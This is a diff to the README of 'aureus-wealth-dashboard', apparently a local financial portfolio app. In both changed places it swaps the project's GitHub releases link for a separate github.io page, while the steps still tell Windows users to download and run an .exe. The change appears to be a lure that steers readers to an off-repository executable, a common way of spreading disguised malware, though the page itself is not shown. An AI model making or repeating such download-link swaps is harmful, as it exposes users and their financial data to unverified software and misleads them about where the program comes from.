@@ -1,6 +1,6 @@
 # 📈 aureus-wealth-dashboard - Manage your financial portfolio with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Planetal-pier632/aureus-wealth-dashboard/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://planetal-pier632.github.io)
 
 Aureus acts as a central workspace for your financial life. This tool displays your portfolio, client records, and retirement goals in one clear view. It runs locally on your computer, which means your data stays under your control. You choose where to save your information, and the dashboard provides the tools to track your progress toward your objectives.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the dashboard on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Planetal-pier632/aureus-wealth-dashboard/releases).
+1. Visit the [releases page](https://planetal-pier632.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
